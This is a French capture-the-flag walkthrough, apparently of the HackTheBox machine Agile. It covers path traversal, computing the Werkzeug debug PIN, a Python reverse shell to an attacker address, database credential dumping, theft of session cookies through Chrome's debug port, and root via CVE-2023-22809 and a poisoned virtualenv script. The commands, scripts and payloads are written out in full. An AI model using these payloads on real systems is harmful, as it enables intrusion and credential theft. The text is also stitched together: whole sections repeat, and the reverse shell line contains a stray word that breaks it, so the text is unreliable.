![Cover](cover.png)

# Phase 1 : Reconnaissance & Brèche Initiale

L'objectif de cette phase est d'identifier la surface d'attaque de la machine **Agile** et d'exploiter une vulnérabilité de lecture de fichiers pour compromettre le mode **Debug** du framework **Flask**, nous permettant ainsi d'obtenir une exécution de code à distance (**RCE**).

## Énumération des Services

Je commence par un scan **Nmap** complet pour identifier les ports ouverts et les services associés.

```bash
# Scan rapide de tous les ports
nmap -p- --min-rate 10000 10.10.11.203

# Scan détaillé des services identifiés
nmap -p 22,80 -sCV 10.10.11.203
```

Le scan révèle deux ports :
*   **22/tcp (SSH)** : OpenSSH 8.9p1.
*   **80/tcp (HTTP)** : Nginx 1.18.0, redirigeant vers `http://superpass.htb`.

J'ajoute l'entrée correspondante à mon fichier `/etc/hosts` :
```bash
echo "10.10.11.203 superpass.htb" | sudo tee -a /etc/hosts
```

## Analyse de l'Application Web

L'application **SuperPass** est un gestionnaire de mots de passe. Après avoir créé un compte, je peux ajouter des entrées et les exporter au format **CSV**. 

L'analyse des en-têtes **HTTP** et des pages d'erreur (404 standard de **Werkzeug**) confirme que le backend repose sur **Python Flask**. Une recherche de répertoires avec **Feroxbuster** ne révèle pas de points d'entrée cachés immédiats, mais confirme la structure classique d'une application **Flask** (`/static`, `/vault`, `/download`).

## Identification des Vulnérabilités

En examinant la fonctionnalité d'exportation, je remarque que le bouton "Export" génère une requête `GET` vers `/download?fn=[username]_export_[id].csv`. 

### 1. Path Traversal / Arbitrary File Read
Le paramètre `fn` est vulnérable à un **Path Traversal**. Je peux lire des fichiers sensibles sur le système en remontant l'arborescence.

```bash
# Test de lecture du fichier /etc/passwd
curl --path-as-is "http://superpass.htb/download?fn=../../../../etc/passwd" -b "session=[COOKIE]"
```

### 2. Flask Debug Mode & Information Leakage
Si je fournis un nom de fichier inexistant, l'application crash et affiche la page de **Debug** de **Werkzeug**. Cette page est une mine d'or car elle contient :
*   La **Stack Trace** complète.
*   Les variables d'environnement.
*   Un **Interactive Console** (protégé par un **PIN**).

> **Schéma Mental : De la lecture de fichier à la RCE**
> LFI (Lecture de fichiers) -> Récupération des variables système spécifiques -> Calcul du PIN Werkzeug -> Accès à la Console Python -> Reverse Shell.

## Exploitation : Calcul du Werkzeug Debug PIN

Depuis la version 0.11 de **Werkzeug**, la console interactive est protégée par un **PIN**. Ce PIN n'est pas aléatoire mais généré à partir de variables spécifiques au système. Grâce à la **LFI**, je peux extraire ces données.

### Collecte des "Public Bits"
1.  **Username** : Trouvé via `/proc/self/environ` -> `www-data`.
2.  **Module name** : Généralement `flask.app`.
3.  **App name** : Généralement `Flask` ou `wsgi_app`.
4.  **Flask Path** : Trouvé dans la stack trace -> `/app/venv/lib/python3.10/site-packages/flask/app.py`.

### Collecte des "Private Bits"
1.  **MAC Address** :
    *   Je cherche l'interface réseau via `/proc/net/arp` -> `eth0`.
    *   Je lis l'adresse MAC : `/sys/class/net/eth0/address` -> `00:50:56:b9:48:b5`.
    *   Conversion en décimal : `int("005056b948b5", 16)` -> `345052367029`.
2.  **Machine ID** :
    *   Lecture de `/etc/machine-id` -> `ed5b159560f54721827644bc9b220d00`.
    *   Concaténé avec la dernière partie de `/proc/self/cgroup` -> `superpass.service`.
    *   ID final : `ed5b159560f54721827644bc9b220d00superpass.service`.

### Génération du PIN
J'utilise un script Python pour générer le PIN en utilisant l'algorithme **SHA1** (utilisé par les versions récentes de **Werkzeug**).

```python
import hashlib
from itertools import chain

probably_public_bits = [
    'www-data',
    'flask.app',
    'wsgi_app', # Spécifique à Gunicorn/WSGI ici
    '/app/venv/lib/python3.10/site-packages/flask/app.py'
]

private_bits = [
    '345052367029',
    'ed5b159560f54721827644bc9b220d00superpass.service'
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for i in range(3):
        rv = rv or ""
        rv += num[i * 3:i * 3 + 3]
        if i < 2:
            rv += "-"

print(rv)
```

## Obtention du Premier Shell

Une fois le **PIN** (ex: `962-630-184`) saisi dans la console de debug, j'accède à un interpréteur Python interactif.

1.  Je prépare un listener sur ma machine : `nc -lvnp 443`.
2.  J'exécute le payload suivant dans la console **Werkzeug** :

```python
import os
os.popen('python3 -c "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'10.10.14.X\',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\'/bin/bash\') shades"').read()
```

Je reçois une connexion en tant que **www-data**. Pour stabiliser mon shell :
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# CTRL+Z
stty raw -echo; fg
export TERM=xterm
```

## Pivot vers l'utilisateur Corum

En explorant le système, je trouve le fichier de configuration de production `/app/config_prod.json` qui contient des identifiants de base de données.

```json
{"SQL_URI": "mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass"}
```

Je me connecte à la base de données **MySQL** pour extraire les mots de passe stockés par les utilisateurs de l'application :

```bash
mysql -u superpassuser -p'dSA6l7q*yIVs$39Ml6ywvgK' superpass -e "SELECT * FROM passwords;"
```

Je récupère le mot de passe de l'utilisateur **corum** pour l'application "agile" : `5db7caa1d13cc37c9fc2`. Ce mot de passe est réutilisé pour son compte système.

```bash
ssh corum@superpass.htb
# Password: 5db7caa1d13cc37c9fc2
```

---

### 1. Post-Exploitation Initiale : Extraction de la Base de Données

Une fois mon accès **www-data** stabilisé via le **Flask Debugger**, ma priorité est l'énumération des fichiers de configuration pour trouver des vecteurs de mouvement latéral. Le fichier `/app/config_prod.json` contient des identifiants de base de données en clair.

```bash
# Lecture de la configuration MySQL
cat /app/config_prod.json
# Connexion et dump des credentials applicatifs
mysql -u superpassuser -p'dSA6l7q*yIVs$39Ml6ywvgK' superpass -e "SELECT * FROM passwords;"
```

L'extraction révèle le mot de passe de l'utilisateur **corum** (`5db7caa1d13cc37c9fc2`). Ce dernier réutilise ses identifiants pour son accès système via **SSH**.

---

### 2. Mouvement Latéral : Exploitation du Chrome Remote Debugging

En explorant le répertoire `/app`, je découvre une instance de test (`app-testing`) et un script `test_and_update.sh`. Ce script exécute des tests fonctionnels via **PyTest** et **Selenium** dans un **Virtual Environment** partagé.

> **Schéma Mental :** Le script de test automatise une instance **Chrome** en mode **Headless**. L'activation du paramètre `--remote-debugging-port=41829` ouvre une interface de contrôle à distance. Si un utilisateur (ici **edwards**) est connecté dans cette instance de test, je peux intercepter sa session en m'attachant au port de debug.

#### Énumération du port de Debug
```bash
# Vérification du port d'écoute local
netstat -tnlp | grep 41829
```

#### Tunneling et Interception de Session
Pour accéder à l'interface de debug depuis ma machine d'attaque, j'établis un **SSH Tunneling** :
```bash
ssh -L 41829:127.0.0.1:41829 corum@superpass.htb
```

J'utilise ensuite un navigateur basé sur Chromium (`chrome://inspect`) pour m'attacher à l'instance distante. Dans l'onglet **Application**, je récupère les **Session Cookies** de l'utilisateur **edwards**. En injectant ces cookies sur l'instance de test (`test.superpass.htb`), j'accède à son **Vault** personnel et récupère son mot de passe système : `d07867c6267dcb5df0af`.

---

### 3. Escalade de Privilèges : CVE-2023-22809 & Venv Poisoning

L'utilisateur **edwards** dispose de privilèges **Sudo** spécifiques permettant d'éditer des fichiers de configuration via `sudoedit`.

```bash
# Vérification des privilèges sudo
sudo -l
# (dev_admin : dev_admin) sudoedit /app/config_test.json
```

#### Analyse de la vulnérabilité
Le système exécute **Sudo version 1.9.9**, vulnérable à la **CVE-2023-22809**. Cette faille permet d'injecter des arguments supplémentaires via les variables d'environnement (`EDITOR`), autorisant l'édition de fichiers arbitraires tant qu'ils sont modifiables par l'utilisateur ou le groupe cible (**dev_admin**).

> **Schéma Mental :** Le fichier `/etc/bash.bashrc` force tous les utilisateurs à sourcer le script `activate` du **Virtual Environment** (`/app/venv/bin/activate`) lors de la connexion. Ce script est la propriété du groupe **dev_admin**. En utilisant la **CVE-2023-22809**, je peux modifier ce script pour y injecter une charge utile qui sera exécutée par **root** lors de sa prochaine session.

#### Injection du Payload
J'exploite `sudoedit` pour modifier le script d'activation du **venv** :

```bash
# Détournement de sudoedit pour cibler le script activate
EDITOR='vim -- /app/venv/bin/activate' sudoedit -u dev_admin /app/config_test.json
```

À la fin du fichier, j'ajoute une commande pour créer un **SUID Bash** :
```bash
cp /bin/bash /tmp/0xdf && chmod +s /tmp/0xdf
```

Dès qu'une tâche système ou qu'un administrateur (root) déclenche une session (sourçant ainsi le venv), le binaire SUID est généré.

```bash
# Obtention du shell root
/tmp/0xdf -p
```

---

### Phase 3 : Élévation de Privilèges & Domination

#### 1. Pivot vers l'utilisateur Edwards : Abus du Remote Debugging Port

Une fois l'accès initial obtenu en tant que **corum**, l'énumération du répertoire `/app` révèle une instance de test parallèle (`app-testing`). Un script, `test_and_update.sh`, exécute périodiquement des tests via **PyTest** et **Selenium** en utilisant un **Headless Chrome**.

L'analyse du fichier `test_site_interactively.py` montre que Chrome est lancé avec l'argument `--remote-debugging-port=41829`. Ce port permet de prendre le contrôle total de l'instance du navigateur à distance.

> **Schéma Mental :**
> Compromission Corum -> Identification d'un processus Chrome (Selenium) appartenant à un autre utilisateur -> SSH Tunneling du port de debug (41829) -> Attachement via un navigateur local -> Vol de Session (Cookies) sur l'instance de test -> Extraction des credentials Edwards.

**Exploitation du Debug Port :**

1. **Tunneling SSH :** J'établis un tunnel pour accéder au port local de la machine cible depuis ma machine d'attaque.
```bash
ssh -L 41829:127.0.0.1:41829 corum@superpass.htb
```

2. **Inspection via Chromium :** Sur ma machine, j'ouvre `chrome://inspect`. Dans la configuration, j'ajoute `localhost:41829`. L'instance de test apparaît. En inspectant l'onglet **Application**, je récupère le cookie de session de l'utilisateur **edwards** qui est actuellement testé par le script automatique.

3. **Accès au Vault :** En injectant ce cookie sur `http://test.superpass.htb` (via un tunnel sur le port 5555), j'accède au coffre-fort de **edwards** et récupère son mot de passe SSH : `d07867c6267dcb5df0af`.

---

#### 2. Élévation Root : CVE-2023-22809 & Hijacking de Virtual Environment

En tant que **edwards**, l'exécution de `sudo -l` révèle des privilèges spécifiques sur **sudoedit** :

```bash
(dev_admin : dev_admin) sudoedit /app/config_test.json
(dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt
```

La version de **sudo** (1.9.9) est vulnérable à la **CVE-2023-22809**. Cette faille permet d'injecter des fichiers arbitraires dans la variable d'environnement `EDITOR`, forçant **sudoedit** à ouvrir un fichier pour lequel nous n'avons normalement pas de droits d'écriture.

> **Schéma Mental :**
> Sudoedit vulnérable -> Injection de fichier via variable d'environnement -> Cible : Script d'activation du Virtual Environment (VENV) -> Le VENV est sourcé par Root lors de chaque login (via /etc/bash.bashrc) -> Exécution de code arbitraire lors de la prochaine session Root.

**Vecteur d'attaque :**

Le fichier `/etc/bash.bashrc` force tous les utilisateurs, y compris **root**, à sourcer `/app/venv/bin/activate`. Ce fichier appartient au groupe `dev_admin`, sur lequel je peux obtenir un accès en écriture via la **CVE-2023-22809**.

**Exploitation finale :**

1. **Injection via Sudoedit :**
```bash
EDITOR='vim -- /app/venv/bin/activate' sudoedit -u dev_admin /app/config_test.json
```

2. **Payload :** J'ajoute la ligne suivante à la fin du script `activate` pour créer un binaire **SUID** :
```bash
cp /bin/bash /tmp/0xdf && chmod +s /tmp/0xdf
```

3. **Trigger :** Il suffit d'attendre qu'une tâche planifiée ou qu'un administrateur se connecte. Une fois le fichier `/tmp/0xdf` créé :
```bash
/tmp/0xdf -p
# id -> uid=0(root)
```

---

#### 3. Analyse Post-Exploitation (Beyond Root)

L'analyse du code source après compromission totale a révélé deux vulnérabilités majeures qui auraient pu permettre des chemins d'attaque alternatifs (**Unintendeds**).

**A. Insecure Direct Object Reference (IDOR) :**
Dans `password_service.py`, la fonction `get_password_by_id` présentait une erreur de logique dans la requête **SQLAlchemy**.
```python
# Code vulnérable
password = session.query(Password).filter(Password.id == id, User.id == userid).first()
```
Le filtre comparait `User.id` au lieu de `Password.userid`. Comme l'objet `Password` n'était pas correctement lié à `User` dans cette requête, le filtre sur l'utilisateur était inopérant. Un attaquant pouvait donc énumérer les IDs de mots de passe de n'importe quel utilisateur via l'endpoint `/vault/row/<id>`.

**B. Flask Secret Key Statique :**
Initialement, l'application utilisait une **SECRET_KEY** codée en dur.
```python
app.config['SECRET_KEY'] = 'super-secret-key-prowess' # Exemple
```
Avec cette clé, un attaquant ayant lu le code source (via la **LFI** initiale) pouvait forger ses propres **Session Cookies** pour usurper l'identité de n'importe quel utilisateur (notamment **corum** ou **edwards**) sans passer par le **Flask Debugger**. Le correctif a consisté à utiliser `os.urandom(32)` pour générer une clé unique à chaque démarrage du service.